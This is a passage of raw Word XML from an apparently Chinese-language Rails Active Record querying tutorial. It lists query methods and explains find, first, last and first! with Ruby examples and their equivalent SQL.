          <w:numId w:val="57"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>select</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FF7C5BE" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="57"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>group</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F69DCD2" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="57"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>order</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B49331D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="57"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>reorder</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="323ABCAC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="57"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>reverse_order</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1264E3DC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="57"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>limit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43862C70" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="57"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>offset</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D63A366" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="57"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>joins</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42804A4F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="57"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>includes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EAF92C3" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="57"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>lock</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="409E296B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="57"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>readonly</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EA7BAE7" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="57"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>from</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53B9D8E7" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="57"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>having</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BC2FD79" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">上面的所有方法都返回一个 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveRecord::Relation</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 实例。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2282BF7C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Model.find(options)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 的主要操作可以概括如下：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CF8B830" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="58"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>根据参数生成相应的</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>查询语句。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CBECF7F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="58"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>执行</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>查询并返回符合条件的结果。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F2B0E9A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="58"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>为每个结果行实例化成该</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Model </w:t>
      </w:r>
      <w:r>
        <w:t>的对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31DC377C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="58"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>如果有的话，执行</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>after_find</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>的回调函数。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68496E88" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>1.1 查询单个对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6422331E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Active Record 提供了五种方式来查询单个对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F0FEC54" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>1.1.1 使用主键</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70EA119A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Model.find(primary_key)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ，你可以找到主键等于 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>primay key</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 的记录。比如：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5256"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="78353526" w14:textId="77777777" w:rsidTr="00F53072">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5EB23EE6" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># 查找主键（ id ）等于 10 的 client 记录。</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7723E46E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>client = Client.find(10)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="36FF38DD" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; #&lt;Client id: 10, first_name: "Ryan"&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2C44DBDB" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">等价的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 语句是：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6359"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="3CE5C2F9" w14:textId="77777777" w:rsidTr="00F53072">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="68B32D82" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="937565820"/>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WHERE</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(clients.id = 10) LIMIT 1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="55758FC4" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">如果找不到匹配的记录， </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Model.find(primary_key)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 会抛出一个 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveRecord::RecordNotFound</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 异常。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A192CB8" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.1.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>first</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52D55281" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">如果存在， </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Model.first</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 会返回该 Model 的第一条记录（根据主键升序排列）。比如：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5016"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="5A2142FF" w14:textId="77777777" w:rsidTr="00F53072">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5CCAF986" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>client = Client.first</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="71D381A3" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; #&lt;Client id: 1, first_name: "Lifo"&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="49142959" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">等价的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 语句是：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3551"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="2EA5439E" w14:textId="77777777" w:rsidTr="00F53072">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="258306B6" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1645624713"/>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LIMIT 1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="151FD387" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">如果没找到匹配的记录， </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Model.first</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 会返回 nil 。它不会抛出异常。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01028E54" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.1.3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>last</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A1AED67" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">如果存在， </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Model.last</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 返回该 Model 的最后一条记录（根据主键升序排列）。 比如：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5496"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="6E1FEC11" w14:textId="77777777" w:rsidTr="00F53072">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="56126DCC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>client = Client.last</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1C0B0733" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; #&lt;Client id: 221, first_name: "Russel"&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="59B03F63" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">等价的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 语句是：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6439"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="1B0D3B07" w14:textId="77777777" w:rsidTr="00F53072">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="597C9281" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1888837731"/>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ORDER</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>BY</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>clients.id DESC</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>LIMIT 1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="659E3F0D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">如果没找到匹配的记录， </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Model.last</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 会返回 nil 。它不会抛出异常。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02E5C8D1" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.1.4 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>first!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4455AD67" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Model.first!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 返回第一条记录。比如：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5016"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="5EA98EE8" w14:textId="77777777" w:rsidTr="00F53072">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="25EA1A18" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>client = Client.first!</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="20F7D4C0" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; #&lt;Client id: 1, first_name: "Lifo"&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="29DC4D39" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
